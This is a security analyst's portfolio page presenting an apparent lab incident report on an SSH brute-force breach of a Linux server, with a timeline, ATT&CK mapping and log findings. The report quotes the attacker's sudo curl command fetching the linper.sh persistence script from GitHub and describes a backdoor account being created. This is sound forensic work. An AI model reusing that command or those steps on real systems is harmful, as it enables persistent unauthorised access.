+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tactic</th><th>Technique / Sub-Technique</th><th>ID</th><th>Artifact / Activity</th></tr></thead><tbody><tr><td><strong>Credential Access</strong></td><td>Brute Force: Password Guessing</td><td><code>T1110.001</code></td><td>Inbound SSH password brute-force against <code>root</code> from IP <code>65.2.161.68</code></td></tr><tr><td><strong>Persistence / Privilege Escalation</strong></td><td>Create Account: Local Account</td><td><code>T1136.001</code></td><td>Creation of backdoor user <code>cyberjunkie</code> with elevated privileges</td></tr><tr><td><strong>Execution</strong></td><td>Command &#x26; Scripting Interpreter: Unix Shell</td><td><code>T1059.004</code></td><td>Execution of <code>curl</code> via <code>sudo</code> to pull the <code>linper.sh</code> persistence script</td></tr></tbody></table>
+<hr>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>An SSH brute-force attack targeting a Linux server hosting Confluence resulted in a successful breach of the <code>root</code> account. Analysis of <code>auth.log</code> and <code>wtmp</code> revealed that after gaining initial access, the threat actor created a privileged backdoor user (<code>cyberjunkie</code>) for persistence and leveraged <code>sudo</code> privileges to fetch an external reconnaissance/persistence script from GitHub.</p>
+<h3 id="incident-timeline">Incident Timeline</h3>
+<ol>
+<li>
+<p><strong>Initial Access &#x26; SSH Brute-Force</strong> — Threat actor IP <code>65.2.161.68</code> conducted an SSH brute-force attack, successfully guessing the credentials for the <code>root</code> account.</p>
+</li>
+<li>
+<p><strong>Interactive Session Established</strong> — At <code>2024-03-06 06:32:45 UTC</code>, the attacker initiated a manual interactive terminal session (SSH session ID <code>37</code>) as <code>root</code>.</p>
+</li>
+<li>
+<p><strong>Persistence Mechanism</strong> — Living off the land, the attacker created a new local account named <code>cyberjunkie</code> and granted it elevated privileges.</p>
+</li>
+<li>
+<p><strong>Session Termination</strong> — The initial <code>root</code> SSH session terminated at <code>2024-03-06 06:37:24 UTC</code>.</p>
+</li>
+<li>
+<p><strong>Post-Exploitation &#x26; Script Execution</strong> — The attacker logged into the backdoor <code>cyberjunkie</code> account and executed <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code> via <code>sudo</code>.</p>
+</li>
+</ol>
+<h3 id="log-artifact-summary">Log Artifact Summary</h3>
+<ul>
+<li><strong>auth.log</strong> — Provided visibility into authentication failures, successful <code>root</code> logins, user creation events (<code>cyberjunkie</code>), session IDs, and executed <code>sudo</code> commands.</li>
+<li><strong>wtmp</strong> — Provided precise session connection timelines, verifying the interactive terminal session at <code>06:32:45 UTC</code>.</li>
+</ul>
+<hr>
+<h2 id="skills-developed">Skills Developed</h2>
+<ul>
+<li>Unix authentication log analysis (<code>auth.log</code>)</li>
+<li>Binary <code>wtmp</code> log analysis and cross-architecture decoding</li>
+<li>Brute-force attack pattern recognition</li>
+<li>Incident timeline reconstruction</li>
+<li>Post-exploitation activity tracking</li>
+<li>MITRE ATT&#x26;CK framework mapping</li>
+</ul> </div> </div> </article> </div> <!-- Bottom Return Action --> <div class="pt-8 border-t border-[var(--border-subtle)] flex flex-wrap items-center justify-between gap-4"> <a href="/#case-files" class="inline-block px-5 py-2.5 bg-[var(--text-primary)] text-[var(--bg-canvas)] text-xs font-mono font-bold uppercase tracking-wider hover:scale-[1.02] transition-transform shadow-md">
+← Return to Portfolio
+</a> <span class="text-xs font-mono text-[var(--text-muted)]">
+Mugerwa Elijah Williams · DFIR &amp; Security Operations
+</span> </div> </div>  </main> <div id="lightbox" class="fixed inset-0 z-[10000] flex items-center justify-center bg-black/60 backdrop-blur-xl opacity-0 pointer-events-none transition-all duration-500"> <div class="cyber-frame bg-[var(--bg-surface)] p-8 sm:p-10 max-w-2xl w-[90%] max-h-[85vh] overflow-y-auto relative scale-95 transition-transform duration-500 shadow-2xl" id="lightbox-inner"> <button id="lightbox-close" class="absolute top-4 right-4 w-9 h-9 rounded-full border border-[var(--border-frame)] bg-[var(--bg-elevated)] text-[var(--text-primary)] hover:bg-[var(--text-primary)] hover:text-[var(--bg-canvas)] flex items-center justify-center text-sm transition-all cursor-pointer" aria-label="Close modal">
+✕
+</button> <div id="lightbox-content" class="space-y-4"></div> </div> </div> <script type="module" src="/_astro/Lightbox.astro_astro_type_script_index_0_lang.iirGc9tY.js"></script> <footer class="py-16 border-t border-[var(--border-frame)] max-w-[1200px] mx-auto px-6 sm:px-12"> <div class="flex flex-col sm:flex-row items-center justify-between gap-6"> <div class="font-mono text-xs text-[var(--text-muted)] tracking-widest uppercase">
+© 2026 Mugerwa Elijah — Kampala, Uganda
+</div> <div class="flex items-center gap-6 font-mono text-xs text-[var(--text-muted)] uppercase tracking-wider"> <a href="https://www.linkedin.com/in/mugerwa-elijah-williams-b12112306" target="_blank" rel="noopener" class="hover:text-[var(--text-primary)] transition-colors">
+LinkedIn
+</a> <a href="https://github.com/MugerwaElijah-lab" target="_blank" rel="noopener" class="hover:text-[var(--text-primary)] transition-colors">
+GitHub
+</a> <a href="mailto:mugerwawilliams62@gmail.com" class="hover:text-[var(--text-primary)] transition-colors">
+Email
+</a> </div> </div> </footer> <script type="module">const f={threshold:.08,rootMargin:"0px 0px -40px 0px"},d=new IntersectionObserver(e=>{e.forEach(o=>{o.isIntersecting&&(o.target.classList.add("is-visible"),d.unobserve(o.target))})},f);document.querySelectorAll(".reveal").forEach(e=>d.observe(e));document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",o=>{o.preventDefault();const r=e.getAttribute("href");if(!r)return;const s=document.querySelector(r);if(s){const n=s.getBoundingClientRect().top+window.scrollY-90;window.scrollTo({top:n,behavior:"smooth"})}})});const l=document.getElementById("matrix-canvas");if(l){const e=l.getContext("2d");let o,r,s;const n=14;let i=[];const c=()=>{o=window.innerWidth,r=window.innerHeight,l.width=o,l.height=r,s=Math.floor(o/n),i=[];for(let t=0;t<s;t++)i[t]=Math.random()*-100};window.addEventListener("resize",c),c();const a=`ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%""'#&_(),.;:?!\\|{}<>[]^~アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン`.split("");setInterval(()=>{e.fillStyle="rgba(0, 0, 0, 0.1)",e.fillRect(0,0,o,r),e.fillStyle="#0088ff",e.font=n+'px "Fira Code", monospace';for(let t=0;t<i.length;t++){const h=a[Math.floor(Math.random()*a.length)];e.fillText(h,t*n,i[t]*n),i[t]*n>r&&Math.random()>.975&&(i[t]=0),i[t]++}},50)}</script> </body> </html>  <script type="module">document.querySelectorAll(".lab-card").forEach(s=>{const t=s.querySelector(".lab-toggle"),e=s.querySelector(".lab-body"),l=s.querySelector(".lab-toggle-btn span");t&&e&&l&&t.addEventListener("click",()=>{e.classList.contains("hidden")?(e.classList.remove("hidden"),e.classList.add("block"),l.textContent="▲ HIDE REPORT",t.setAttribute("aria-expanded","true")):(e.classList.remove("block"),e.classList.add("hidden"),l.textContent="▼ READ REPORT",t.setAttribute("aria-expanded","false"))})});</script>
